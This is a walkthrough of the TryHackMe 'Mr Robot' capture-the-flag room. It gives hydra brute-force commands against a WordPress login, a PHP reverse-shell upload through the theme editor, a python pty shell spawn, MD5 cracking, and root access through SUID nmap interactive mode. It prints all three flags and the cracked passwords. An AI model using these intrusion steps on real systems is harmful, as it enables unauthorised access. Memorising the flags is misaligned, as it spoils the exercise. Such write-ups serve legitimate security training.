Room: Mr Robot CTF

Link: https://tryhackme.com/room/mrrobot

MACHINE IP: 10.10.72.216
   
   NMAP SCAN RESULTS:
     
     22 CLOSED  SSH
     80 OPEN    HTTP
     443 OPEN   SSL/HTTP

 DIRECTORY SCAN RESULTS:
    
    ==> DIRECTORY: http://10.10.72.216/Image/                                                                                   
    ==> DIRECTORY: http://10.10.72.216/images/

#KEY 1
 Just a random guess to check out the robots.txt file and we found a key. 
  http://machine ip/robots.txt.
  
  Content of robot.txt file:
     
     User-agent: *
     fsocity.dic
     key-1-of-3.txt
  wget the files fsocity.dic and key file.
  Opening the key file we have here our key 1.
  KEY 1: 073403c8a58a1f80d943455fb30724b9


 Now let's hunt for key 2.

     wget http://10.10.72.216/fsocity.dic
     now we use command:  sort fsocity.dic | uniq > sorted.dic
     Sorting the list will make it easier for bruteforcing and take less time.

Running the bruforece on the login page via hydra and keeping the password constant so that we can find the username.
     
     hydra -L /home/ghost/tryhackme/mrrobot/fsocitydic -p test machine ip http-post-form "/wp login.php:log=^USER^&PWD=^PWD^:Invalid Username" -t 30

 By bruteforce we find the username is: Elliot

Now, password bruteforce

    hydra -l Elliot -P /home/ghost/tryhackme/mrrobot/fsocity.dic 10.10.173.126 http-post-form "/wp login.php:log=^USER^&PWD=^PWD^:The password you entered for the username" -t 30

FINALLY GOT THE PASSWORD:  ER28-0652

After logging in via the credentials
go to archive.php in appereance section and
upload the reverse shell php script

GO TO THIS URL TO RUN THE SCRIPT:  
 http://machine-ip/wp-content/themes/twentyfifteen/archive.php
Then you will get a reverse shell on your terminal.

 After getting the reverse shell we move to home/robot
 content of robot directory:
    key-2-of-3.txt
    password.raw-md5

 We can't read the txt file
 Reading the contents of passwd file: robot:c3fcd3d76192e4007dfb496cca67e13b
 After cracking the hash we get: abcdefghijklmnopqrstuvwxyz

 Now try to access on robot user and switching to robot user we can not open terminal from /bin/sh –i

 For terminal access now using here python shell spawning script.
  python -c 'import pty; pty.spawn("/bin/bash")'
AFTER THIS: su robot
entering the password we got from decrypting md5 hash.

      We found KEY 2: 822c73956184f694993bede3eb39f959

Now looking for third no. of key,for that switching to root and for root will perform privilege escalation ,

For that figure out which programs have SUID (set owner user id upon execution) of 4000 , so here we run find command
  find / -perm /4000 -print 2>/dev/null
 Since nmap is given in question hint and it is running as root.
 Check the version of nmap 
    nmap --version (since it is very old in this machine it can be exploited)
  
  run nmap in interactive mode 
  nmap --interactive
  and then nmap> !sh 
  
  BAM! YOU GOT THE ROOT SHELL. 
  Go to the root directory and grab the key!
      
      Key 3: 04787ddef27c3dee1ee161b21670b4e4

